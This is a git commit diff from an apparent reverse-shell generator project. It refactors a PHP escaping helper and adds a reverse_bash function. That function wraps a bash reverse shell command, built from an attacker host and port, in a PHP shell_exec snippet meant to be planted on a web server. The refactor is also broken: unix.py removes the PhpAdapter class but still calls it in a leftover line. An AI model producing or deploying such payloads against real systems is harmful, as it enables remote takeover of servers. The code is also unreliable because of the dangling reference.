de5c14fbfd3e311b327a2e842c43ae2c9df44fda
crypt0lith <118923461+crypt0lith@users.noreply.github.com>
2026-03-22 10:57:17 -0500

    move PhpAdapter utils to `php.__init__`

--- revshell/php/__init__.py
+++ revshell/php/__init__.py
@@ -1,3 +1,19 @@
 __all__ = ['cmd']
 
+import json
+from string import Formatter
+
 from . import cmd
+
+def php_escape(__obj: object) -> str:
+    return json.dumps(__obj, ensure_ascii=False).replace('$', r'\$')
+
+class PhpAdapter(Formatter):
+    def convert_field(self, value, conversion):
+        return (
+            php_escape(value)
+            if conversion == "p"
+            else super().convert_field(value, conversion)
+        )
+
+php_adapter = PhpAdapter().format
--- revshell/php/cmd/unix.py
+++ revshell/php/cmd/unix.py
@@ -1,20 +1,16 @@
 __all__ = ['reverse_bash']
 
-from json import dumps as to_json
-from string import Formatter
-
 from ...cmd.unix import reverse_bash as bash_cmd
 from ...util import kwdefaults_from
 
 
-def _php_escape(__s: str) -> str:
-    return to_json(__s, ensure_ascii=False).replace('$', r'\$')
+@kwdefaults_from(bash_cmd)
+def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
+    from .. import php_adapter
 
-
-class PhpAdapter(Formatter):
-    def format_field(self, value, format_spec):
-        return _php_escape(super().format_field(value, format_spec))
-
+    return php_adapter(
+        "<pre><?= shell_exec({!p}) ?></pre>", bash_cmd(lhost, lport, **kwargs)
+    )
 
 _php_adapter = PhpAdapter().format
 
